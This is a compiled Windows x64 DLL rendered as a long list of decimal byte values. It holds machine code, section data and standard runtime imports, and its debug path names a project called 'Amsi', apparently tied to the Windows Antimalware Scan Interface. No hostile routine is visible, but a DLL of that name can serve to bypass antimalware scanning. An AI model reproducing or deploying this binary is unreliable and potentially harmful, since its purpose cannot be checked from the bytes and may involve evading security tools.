0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 51 192 195 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 102 102 15 31 132 0 0 0 0 0 72 59 13 217 31 0 0 242 117 18 72 193 193 16 102 247 193 255 255 242 117 2 242 195 72 193 201 16 233 211 3 0 0 204 204 204 72 131 236 40 133 210 116 57 131 234 1 116 40 131 234 1 116 22 131 250 1 116 10 184 1 0 0 0 72 131 196 40 195 232 142 5 0 0 235 5 232 95 5 0 0 15 182 192 72 131 196 40 195 73 139 208 72 131 196 40 233 15 0 0 0 77 133 192 15 149 193 72 131 196 40 233 44 1 0 0 72 137 92 36 8 72 137 116 36 16 72 137 124 36 32 65 86 72 131 236 32 72 139 242 76 139 241 51 201 232 2 6 0 0 132 192 117 7 51 192 233 232 0 0 0 232 150 4 0 0 138 216 136 68 36 64 64 183 1 131 61 234 36 0 0 0 116 10 185 7 0 0 0 232 62 9 0 0 199 5 212 36 0 0 1 0 0 0 232 199 4 0 0 132 192 116 103 232 110 10 0 0 72 141 13 179 10 0 0 232 6 8 0 0 232 197 8 0 0 72 141 13 206 8 0 0 232 245 7 0 0 232 224 8 0 0 72 141 21 253 15 0 0 72 141 13 238 15 0 0 232 213 12 0 0 133 192 117 41 232 96 4 0 0 132 192 116 32 72 141 21 205 15 0 0 72 141 13 190 15 0 0 232 175 12 0 0 199 5 103 36 0 0 2 0 0 0 64 50 255 138 203 232 9 7 0 0 64 132 255 15 133 78 255 255 255 232 167 8 0 0 72 139 216 72 131 56 0 116 36 72 139 200 232 78 6 0 0 132 192 116 24 72 139 27 72 139 203 232 111 10 0 0 76 139 198 186 2 0 0 0 73 139 206 255 211 255 5 156 30 0 0 184 1 0 0 0 72 139 92 36 48 72 139 116 36 56 72 139 124 36 72 72 131 196 32 65 94 195 204 72 137 92 36 8 72 137 116 36 24 87 72 131 236 32 64 138 241 139 5 104 30 0 0 51 219 133 192 127 4 51 192 235 80 255 200 137 5 86 30 0 0 232 109 3 0 0 64 138 248 136 68 36 56 131 61 195 35 0 0 2 116 10 185 7 0 0 0 232 23 8 0 0 232 102 4 0 0 137 29 172 35 0 0 232 139 4 0 0 64 138 207 232 75 6 0 0 51 210 64 138 206 232 101 6 0 0 132 192 15 149 195 139 195 72 139 92 36 48 72 139 116 36 64 72 131 196 32 95 195 204 204 72 139 196 72 137 88 32 76 137 64 24 137 80 16 72 137 72 8 86 87 65 86 72 131 236 64 77 139 240 139 250 72 139 241 141 66 255 131 248 1 119 46 232 217 0 0 0 139 216 137 68 36 48 133 192 15 132 179 0 0 0 77 139 198 139 215 72 139 206 232 182 253 255 255 139 216 137 68 36 48 133 192 15 132 152 0 0 0 131 255 1 117 8 72 139 206 232 55 11 0 0 77 139 198 139 215 72 139 206 232 74 253 255 255 139 216 137 68 36 48 131 255 1 117 52 133 192 117 39 77 139 198 51 210 72 139 206 232 46 253 255 255 77 139 198 51 210 72 139 206 232 101 253 255 255 77 139 198 51 210 72 139 206 232 96 0 0 0 131 255 1 117 4 133 219 116 4 133 255 117 12 72 139 206 232 229 10 0 0 133 255 116 5 131 255 3 117 42 77 139 198 139 215 72 139 206 232 45 253 255 255 139 216 137 68 36 48 133 192 116 19 77 139 198 139 215 72 139 206 232 30 0 0 0 139 216 137 68 36 48 235 6 51 219 137 92 36 48 139 195 72 139 92 36 120 72 131 196 64 65 94 95 94 195 72 137 92 36 8 72 137 108 36 16 72 137 116 36 24 87 72 131 236 32 72 139 29 233 13 0 0 73 139 248 139 242 72 139 233 72 133 219 117 5 141 67 1 235 18 72 139 203 232 127 8 0 0 76 139 199 139 214 72 139 205 255 211 72 139 92 36 48 72 139 108 36 56 72 139 116 36 64 72 131 196 32 95 195 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 73 139 248 139 218 72 139 241 131 250 1 117 5 232 99 5 0 0 76 139 199 139 211 72 139 206 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 233 103 254 255 255 204 204 204 64 83 72 131 236 32 72 139 217 51 201 255 21 119 12 0 0 72 139 203 255 21 6 12 0 0 255 21 32 12 0 0 72 139 200 186 9 4 0 192 72 131 196 32 91 72 255 37 76 12 0 0 72 137 76 36 8 72 131 236 56 185 23 0 0 0 232 13 10 0 0 133 192 116 7 185 2 0 0 0 205 41 72 141 13 183 28 0 0 232 170 0 0 0 72 139 68 36 56 72 137 5 158 29 0 0 72 141 68 36 56 72 131 192 8 72 137 5 46 29 0 0 72 139 5 135 29 0 0 72 137 5 248 27 0 0 72 139 68 36 64 72 137 5 252 28 0 0 199 5 210 27 0 0 9 4 0 192 199 5 204 27 0 0 1 0 0 0 199 5 214 27 0 0 1 0 0 0 184 8 0 0 0 72 107 192 0 72 141 13 206 27 0 0 72 199 4 1 2 0 0 0 184 8 0 0 0 72 107 192 0 72 139 13 70 27 0 0 72 137 76 4 32 184 8 0 0 0 72 107 192 1 72 139 13 57 27 0 0 72 137 76 4 32 72 141 13 125 12 0 0 232 0 255 255 255 72 131 196 56 195 204 204 204 64 83 86 87 72 131 236 64 72 139 217 255 21 31 11 0 0 72 139 179 248 0 0 0 51 255 69 51 192 72 141 84 36 96 72 139 206 255 21 253 10 0 0 72 133 192 116 57 72 131 100 36 56 0 72 141 76 36 104 72 139 84 36 96 76 139 200 72 137 76 36 48 76 139 198 72 141 76 36 112 72 137 76 36 40 51 201 72 137 92 36 32 255 21 190 10 0 0 255 199 131 255 2 124 177 72 131 196 64 95 94 91 195 204 204 204 72 131 236 40 232 103 8 0 0 133 192 116 33 101 72 139 4 37 48 0 0 0 72 139 72 8 235 5 72 59 200 116 20 51 192 240 72 15 177 13 64 32 0 0 117 238 50 192 72 131 196 40 195 176 1 235 247 204 204 204 72 131 236 40 232 43 8 0 0 133 192 116 7 232 94 6 0 0 235 5 232 95 8 0 0 176 1 72 131 196 40 195 72 131 236 40 51 201 232 65 1 0 0 132 192 15 149 192 72 131 196 40 195 204 204 204 72 131 236 40 232 99 8 0 0 132 192 117 4 50 192 235 18 232 86 8 0 0 132 192 117 7 232 77 8 0 0 235 236 176 1 72 131 196 40 195 72 131 236 40 232 59 8 0 0 232 54 8 0 0 176 1 72 131 196 40 195 204 204 204 72 137 92 36 8 72 137 108 36 16 72 137 116 36 24 87 72 131 236 32 73 139 249 73 139 240 139 218 72 139 233 232 152 7 0 0 133 192 117 23 131 251 1 117 18 72 139 207 232 187 5 0 0 76 139 198 51 210 72 139 205 255 215 72 139 84 36 88 139 76 36 80 72 139 92 36 48 72 139 108 36 56 72 139 116 36 64 72 131 196 32 95 233 153 7 0 0 204 204 204 72 131 236 40 232 79 7 0 0 133 192 116 16 72 141 13 72 31 0 0 72 131 196 40 233 145 7 0 0 232 106 249 255 255 133 192 117 5 232 143 7 0 0 72 131 196 40 195 72 131 236 40 51 201 232 141 7 0 0 72 131 196 40 233 132 7 0 0 64 83 72 131 236 32 15 182 5 59 31 0 0 133 201 187 1 0 0 0 15 68 195 136 5 43 31 0 0 232 46 5 0 0 232 93 7 0 0 132 192 117 4 50 192 235 20 232 80 7 0 0 132 192 117 9 51 201 232 69 7 0 0 235 234 138 195 72 131 196 32 91 195 204 204 204 72 137 92 36 8 85 72 139 236 72 131 236 64 139 217 131 249 1 15 135 166 0 0 0 232 171 6 0 0 133 192 116 43 133 219 117 39 72 141 13 160 30 0 0 232 225 6 0 0 133 192 116 4 50 192 235 122 72 141 13 164 30 0 0 232 205 6 0 0 133 192 15 148 192 235 103 72 139 21 169 24 0 0 73 131 200 255 139 194 185 64 0 0 0 131 224 63 43 200 176 1 73 211 200 76 51 194 76 137 69 224 76 137 69 232 15 16 69 224 76 137 69 240 242 15 16 77 240 15 17 5 69 30 0 0 76 137 69 224 76 137 69 232 15 16 69 224 76 137 69 240 242 15 17 13 61 30 0 0 242 15 16 77 240 15 17 5 57 30 0 0 242 15 17 13 65 30 0 0 72 139 92 36 80 72 131 196 64 93 195 185 5 0 0 0 232 84 2 0 0 204 204 204 204 72 131 236 24 76 139 193 184 77 90 0 0 102 57 5 29 232 255 255 117 124 72 99 5 80 232 255 255 72 141 21 13 232 255 255 72 141 12 16 129 57 80 69 0 0 117 98 184 11 2 0 0 102 57 65 24 117 87 76 43 194 15 183 65 20 72 141 81 24 72 3 208 15 183 65 6 72 141 12 128 76 141 12 202 72 137 20 36 73 59 209 116 24 139 74 12 76 59 193 114 10 139 66 8 3 193 76 59 192 114 8 72 131 194 40 235 223 51 210 72 133 210 117 4 50 192 235 23 247 66 36 0 0 0 128 116 4 50 192 235 10 176 1 235 6 50 192 235 2 50 192 72 131 196 24 195 64 83 72 131 236 32 138 217 232 83 5 0 0 51 210 133 192 116 11 132 219 117 7 72 135 21 62 29 0 0 72 131 196 32 91 195 64 83 72 131 236 32 128 61 99 29 0 0 0 138 217 116 4 132 210 117 14 138 203 232 144 5 0 0 138 203 232 137 5 0 0 176 1 72 131 196 32 91 195 204 64 83 72 131 236 32 72 139 21 55 23 0 0 72 139 217 139 202 72 51 21 251 28 0 0 131 225 63 72 211 202 72 131 250 255 117 10 72 139 203 232 63 5 0 0 235 15 72 139 211 72 141 13 219 28 0 0 232 34 5 0 0 51 201 133 192 72 15 68 203 72 139 193 72 131 196 32 91 195 204 72 131 236 40 232 167 255 255 255 72 247 216 27 192 247 216 255 200 72 131 196 40 195 204 72 137 92 36 32 85 72 139 236 72 131 236 32 72 131 101 24 0 72 187 50 162 223 45 153 43 0 0 72 139 5 185 22 0 0 72 59 195 117 111 72 141 77 24 255 21 226 6 0 0 72 139 69 24 72 137 69 16 255 21 220 6 0 0 139 192 72 49 69 16 255 21 216 6 0 0 139 192 72 141 77 32 72 49 69 16 255 21 208 6 0 0 139 69 32 72 141 77 16 72 193 224 32 72 51 69 32 72 51 69 16 72 51 193 72 185 255 255 255 255 255 255 0 0 72 35 193 72 185 51 162 223 45 153 43 0 0 72 59 195 72 15 68 193 72 137 5 69 22 0 0 72 139 92 36 72 72 247 208 72 137 5 62 22 0 0 72 131 196 32 93 195 72 141 13 57 28 0 0 72 255 37 82 6 0 0 204 204 72 141 13 41 28 0 0 233 6 4 0 0 72 141 5 45 28 0 0 195 72 141 5 45 28 0 0 195 72 131 236 40 232 231 255 255 255 72 131 8 4 232 230 255 255 255 72 131 8 2 72 131 196 40 195 204 72 141 5 25 28 0 0 195 72 137 92 36 8 85 72 141 172 36 64 251 255 255 72 129 236 192 5 0 0 139 217 185 23 0 0 0 232 243 3 0 0 133 192 116 4 139 203 205 41 131 37 224 27 0 0 0 72 141 77 240 51 210 65 184 208 4 0 0 232 151 3 0 0 72 141 77 240 255 21 173 5 0 0 72 139 157 232 0 0 0 72 141 149 216 4 0 0 72 139 203 69 51 192 255 21 139 5 0 0 72 133 192 116 60 72 131 100 36 56 0 72 141 141 224 4 0 0 72 139 149 216 4 0 0 76 139 200 72 137 76 36 48 76 139 195 72 141 141 232 4 0 0 72 137 76 36 40 72 141 77 240 72 137 76 36 32 51 201 255 21 66 5 0 0 72 139 133 200 4 0 0 72 141 76 36 80 72 137 133 232 0 0 0 51 210 72 141 133 200 4 0 0 65 184 152 0 0 0 72 131 192 8 72 137 133 136 0 0 0 232 0 3 0 0 72 139 133 200 4 0 0 72 137 68 36 96 199 68 36 80 21 0 0 64 199 68 36 84 1 0 0 0 255 21 14 5 0 0 131 248 1 72 141 68 36 80 72 137 68 36 64 72 141 69 240 15 148 195 72 137 68 36 72 51 201 255 21 45 5 0 0 72 141 76 36 64 255 21 186 4 0 0 133 192 117 10 246 219 27 192 33 5 220 26 0 0 72 139 156 36 208 5 0 0 72 129 196 192 5 0 0 93 195 204 204 204 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 72 141 29 154 9 0 0 72 141 53 147 9 0 0 235 22 72 139 59 72 133 255 116 10 72 139 207 232 105 0 0 0 255 215 72 131 195 8 72 59 222 114 229 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 195 204 204 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 72 141 29 94 9 0 0 72 141 53 87 9 0 0 235 22 72 139 59 72 133 255 116 10 72 139 207 232 29 0 0 0 255 215 72 131 195 8 72 59 222 114 229 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 195 204 204 72 255 37 241 4 0 0 204 72 137 92 36 16 85 72 139 236 72 131 236 32 131 101 232 0 51 201 51 192 199 5 245 19 0 0 2 0 0 0 15 162 68 139 193 199 5 226 19 0 0 1 0 0 0 65 129 240 110 116 101 108 68 139 202 65 129 241 105 110 101 73 68 139 210 69 11 200 139 211 129 242 71 101 110 117 68 139 216 68 11 202 184 1 0 0 0 65 15 148 192 129 241 99 65 77 68 129 243 65 117 116 104 65 129 242 101 110 116 105 65 11 218 11 217 65 15 148 194 51 201 15 162 68 139 201 137 69 240 69 132 192 68 137 77 248 68 139 5 156 25 0 0 139 200 137 93 244 137 85 252 116 82 72 131 13 118 19 0 0 255 65 131 200 4 37 240 63 255 15 68 137 5 122 25 0 0 61 192 6 1 0 116 40 61 96 6 2 0 116 33 61 112 6 2 0 116 26 5 176 249 252 255 131 248 32 119 27 72 187 1 0 1 0 1 0 0 0 72 15 163 195 115 11 65 131 200 1 68 137 5 64 25 0 0 69 132 210 116 25 129 225 0 15 240 15 129 249 0 15 96 0 124 11 65 131 200 4 68 137 5 34 25 0 0 184 7 0 0 0 137 85 224 68 137 77 228 68 59 216 124 36 51 201 15 162 137 69 240 137 93 244 137 77 248 137 85 252 137 93 232 15 186 227 9 115 11 65 131 200 2 68 137 5 237 24 0 0 65 15 186 225 20 115 110 199 5 192 18 0 0 2 0 0 0 199 5 186 18 0 0 6 0 0 0 65 15 186 225 27 115 83 65 15 186 225 28 115 76 51 201 15 1 208 72 193 226 32 72 11 208 72 137 85 16 72 139 69 16 36 6 60 6 117 50 139 5 140 18 0 0 131 200 8 199 5 123 18 0 0 3 0 0 0 246 69 232 32 137 5 117 18 0 0 116 19 131 200 32 199 5 98 18 0 0 5 0 0 0 137 5 96 18 0 0 51 192 72 139 92 36 56 72 131 196 32 93 195 204 204 204 51 192 57 5 92 18 0 0 15 149 192 195 194 0 0 204 204 204 204 204 255 37 178 2 0 0 255 37 164 2 0 0 255 37 150 2 0 0 255 37 136 2 0 0 255 37 122 2 0 0 255 37 228 2 0 0 255 37 214 2 0 0 255 37 200 2 0 0 255 37 186 2 0 0 255 37 172 2 0 0 255 37 158 2 0 0 255 37 144 2 0 0 255 37 130 2 0 0 255 37 116 2 0 0 255 37 30 2 0 0 204 204 176 1 195 204 204 204 204 204 204 204 102 102 15 31 132 0 0 0 0 0 255 224 64 85 72 131 236 32 72 139 234 138 77 64 72 131 196 32 93 233 4 250 255 255 204 64 85 72 131 236 32 72 139 234 232 45 248 255 255 138 77 56 72 131 196 32 93 233 232 249 255 255 204 64 85 72 131 236 48 72 139 234 72 139 1 139 16 72 137 76 36 40 137 84 36 32 76 141 13 161 241 255 255 76 139 69 112 139 85 104 72 139 77 96 232 93 247 255 255 144 72 131 196 48 93 195 204 64 85 72 139 234 72 139 1 51 201 129 56 5 0 0 192 15 148 193 139 193 93 195 204 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 106 41 0 0 0 0 0 0 86 41 0 0 0 0 0 0 60 41 0 0 0 0 0 0 40 41 0 0 0 0 0 0 164 41 0 0 0 0 0 0 94 42 0 0 0 0 0 0 72 42 0 0 0 0 0 0 46 42 0 0 0 0 0 0 24 42 0 0 0 0 0 0 2 42 0 0 0 0 0 0 232 41 0 0 0 0 0 0 204 41 0 0 0 0 0 0 184 41 0 0 0 0 0 0 134 41 0 0 0 0 0 0 0 0 0 0 0 0 0 0 52 40 0 0 0 0 0 0 20 40 0 0 0 0 0 0 252 39 0 0 0 0 0 0 218 39 0 0 0 0 0 0 184 39 0 0 0 0 0 0 0 0 0 0 0 0 0 0 252 40 0 0 0 0 0 0 238 40 0 0 0 0 0 0 214 40 0 0 0 0 0 0 186 40 0 0 0 0 0 0 158 40 0 0 0 0 0 0 124 40 0 0 0 0 0 0 106 40 0 0 0 0 0 0 92 40 0 0 0 0 0 0 80 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 216 29 0 128 1 0 0 0 80 30 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 48 0 128 1 0 0 0 240 48 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 136 29 62 87 0 0 0 0 2 0 0 0 65 0 0 0 116 34 0 0 116 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 12 0 0 0 20 0 0 0 184 34 0 0 184 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 13 0 0 0 68 2 0 0 204 34 0 0 204 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 14 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 148 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 48 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 248 32 0 128 1 0 0 0 0 33 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 82 83 68 83 42 80 223 113 29 247 64 69 188 37 18 40 145 144 25 190 50 0 0 0 67 58 92 68 101 118 101 108 111 112 109 101 110 116 92 65 109 115 105 92 120 54 52 92 82 101 108 101 97 115 101 92 65 109 115 105 46 112 100 98 0 0 0 0 0 0 0 0 18 0 0 0 18 0 0 0 1 0 0 0 17 0 0 0 71 67 84 76 0 16 0 0 63 14 0 0 46 116 101 120 116 36 109 110 0 0 0 0 64 30 0 0 18 0 0 0 46 116 101 120 116 36 109 110 36 48 48 0 82 30 0 0 129 0 0 0 46 116 101 120 116 36 120 0 0 32 0 0 248 0 0 0 46 105 100 97 116 97 36 53 0 0 0 0 248 32 0 0 16 0 0 0 46 48 48 99 102 103 0 0 8 33 0 0 8 0 0 0 46 67 82 84 36 88 67 65 0 0 0 0 16 33 0 0 8 0 0 0 46 67 82 84 36 88 67 90 0 0 0 0 24 33 0 0 8 0 0 0 46 67 82 84 36 88 73 65 0 0 0 0 32 33 0 0 8 0 0 0 46 67 82 84 36 88 73 90 0 0 0 0 40 33 0 0 8 0 0 0 46 67 82 84 36 88 80 65 0 0 0 0 48 33 0 0 8 0 0 0 46 67 82 84 36 88 80 90 0 0 0 0 56 33 0 0 8 0 0 0 46 67 82 84 36 88 84 65 0 0 0 0 64 33 0 0 8 0 0 0 46 67 82 84 36 88 84 90 0 0 0 0 80 33 0 0 36 1 0 0 46 114 100 97 116 97 0 0 116 34 0 0 156 2 0 0 46 114 100 97 116 97 36 122 122 122 100 98 103 0 0 0 16 37 0 0 8 0 0 0 46 114 116 99 36 73 65 65 0 0 0 0 24 37 0 0 8 0 0 0 46 114 116 99 36 73 90 90 0 0 0 0 32 37 0 0 8 0 0 0 46 114 116 99 36 84 65 65 0 0 0 0 40 37 0 0 8 0 0 0 46 114 116 99 36 84 90 90 0 0 0 0 48 37 0 0 60 1 0 0 46 120 100 97 116 97 0 0 108 38 0 0 60 0 0 0 46 105 100 97 116 97 36 50 0 0 0 0 168 38 0 0 20 0 0 0 46 105 100 97 116 97 36 51 0 0 0 0 192 38 0 0 248 0 0 0 46 105 100 97 116 97 36 52 0 0 0 0 184 39 0 0 200 2 0 0 46 105 100 97 116 97 36 54 0 0 0 0 0 48 0 0 52 0 0 0 46 100 97 116 97 0 0 0 64 48 0 0 0 6 0 0 46 98 115 115 0 0 0 0 0 64 0 0 176 1 0 0 46 112 100 97 116 97 0 0 0 80 0 0 16 0 0 0 46 103 102 105 100 115 36 121 0 0 0 0 0 96 0 0 88 0 0 0 46 114 115 114 99 36 48 49 0 0 0 0 96 96 0 0 128 1 0 0 46 114 115 114 99 36 48 50 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 17 21 8 0 21 116 9 0 21 100 7 0 21 52 6 0 21 50 17 224 236 29 0 0 1 0 0 0 207 16 0 0 92 17 0 0 82 30 0 0 0 0 0 0 17 15 6 0 15 100 8 0 15 52 6 0 15 50 11 112 236 29 0 0 1 0 0 0 246 17 0 0 20 18 0 0 105 30 0 0 0 0 0 0 1 6 2 0 6 50 2 80 1 20 8 0 20 100 8 0 20 84 7 0 20 52 6 0 20 50 16 112 9 26 6 0 26 52 15 0 26 114 22 224 20 112 19 96 236 29 0 0 1 0 0 0 102 18 0 0 54 19 0 0 133 30 0 0 54 19 0 0 1 6 2 0 6 82 2 80 1 9 1 0 9 98 0 0 1 8 4 0 8 114 4 112 3 96 2 48 9 4 1 0 4 34 0 0 236 29 0 0 1 0 0 0 215 23 0 0 101 24 0 0 187 30 0 0 101 24 0 0 1 2 1 0 2 80 0 0 1 4 1 0 4 66 0 0 1 6 2 0 6 50 2 48 1 13 4 0 13 52 10 0 13 114 6 80 1 13 4 0 13 52 9 0 13 50 6 80 1 21 5 0 21 52 186 0 21 1 184 0 6 80 0 0 1 15 6 0 15 100 7 0 15 52 6 0 15 50 11 112 1 13 4 0 13 52 7 0 13 50 6 80 0 0 0 0 1 0 0 0 56 39 0 0 0 0 0 0 0 0 0 0 62 40 0 0 120 32 0 0 104 39 0 0 0 0 0 0 0 0 0 0 6 41 0 0 168 32 0 0 192 38 0 0 0 0 0 0 0 0 0 0 114 42 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 106 41 0 0 0 0 0 0 86 41 0 0 0 0 0 0 60 41 0 0 0 0 0 0 40 41 0 0 0 0 0 0 164 41 0 0 0 0 0 0 94 42 0 0 0 0 0 0 72 42 0 0 0 0 0 0 46 42 0 0 0 0 0 0 24 42 0 0 0 0 0 0 2 42 0 0 0 0 0 0 232 41 0 0 0 0 0 0 204 41 0 0 0 0 0 0 184 41 0 0 0 0 0 0 134 41 0 0 0 0 0 0 0 0 0 0 0 0 0 0 52 40 0 0 0 0 0 0 20 40 0 0 0 0 0 0 252 39 0 0 0 0 0 0 218 39 0 0 0 0 0 0 184 39 0 0 0 0 0 0 0 0 0 0 0 0 0 0 252 40 0 0 0 0 0 0 238 40 0 0 0 0 0 0 214 40 0 0 0 0 0 0 186 40 0 0 0 0 0 0 158 40 0 0 0 0 0 0 124 40 0 0 0 0 0 0 106 40 0 0 0 0 0 0 92 40 0 0 0 0 0 0 80 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 40 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 105 110 118 111 107 101 95 116 114 105 103 103 101 114 0 41 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 114 101 116 117 114 110 95 116 114 105 103 103 101 114 0 8 0 95 95 67 95 115 112 101 99 105 102 105 99 95 104 97 110 100 108 101 114 0 0 37 0 95 95 115 116 100 95 116 121 112 101 95 105 110 102 111 95 100 101 115 116 114 111 121 95 108 105 115 116 0 0 62 0 109 101 109 115 101 116 0 0 86 67 82 85 78 84 73 77 69 49 52 48 46 100 108 108 0 0 54 0 95 105 110 105 116 116 101 114 109 0 55 0 95 105 110 105 116 116 101 114 109 95 101 0 63 0 95 115 101 104 95 102 105 108 116 101 114 95 100 108 108 0 51 0 95 105 110 105 116 105 97 108 105 122 101 95 110 97 114 114 111 119 95 101 110 118 105 114 111 110 109 101 110 116 0 0 52 0 95 105 110 105 116 105 97 108 105 122 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 0 60 0 95 114 101 103 105 115 116 101 114 95 111 110 101 120 105 116 95 102 117 110 99 116 105 111 110 0 34 0 95 101 120 101 99 117 116 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 30 0 95 99 114 116 95 97 116 101 120 105 116 0 22 0 95 99 101 120 105 116 0 0 97 112 105 45 109 115 45 119 105 110 45 99 114 116 45 114 117 110 116 105 109 101 45 108 49 45 49 45 48 46 100 108 108 0 174 4 82 116 108 67 97 112 116 117 114 101 67 111 110 116 101 120 116 0 181 4 82 116 108 76 111 111 107 117 112 70 117 110 99 116 105 111 110 69 110 116 114 121 0 0 188 4 82 116 108 86 105 114 116 117 97 108 85 110 119 105 110 100 0 0 146 5 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 0 82 5 83 101 116 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 15 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 0 112 5 84 101 114 109 105 110 97 116 101 80 114 111 99 101 115 115 0 0 112 3 73 115 80 114 111 99 101 115 115 111 114 70 101 97 116 117 114 101 80 114 101 115 101 110 116 0 48 4 81 117 101 114 121 80 101 114 102 111 114 109 97 110 99 101 67 111 117 110 116 101 114 0 16 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 73 100 0 20 2 71 101 116 67 117 114 114 101 110 116 84 104 114 101 97 100 73 100 0 0 221 2 71 101 116 83 121 115 116 101 109 84 105 109 101 65 115 70 105 108 101 84 105 109 101 0 84 3 73 110 105 116 105 97 108 105 122 101 83 76 105 115 116 72 101 97 100 0 106 3 73 115 68 101 98 117 103 103 101 114 80 114 101 115 101 110 116 0 75 69 82 78 69 76 51 50 46 100 108 108 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 50 162 223 45 153 43 0 0 205 93 32 210 102 212 255 255 255 255 255 255 0 0 0 0 1 0 0 0 2 0 0 0 47 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 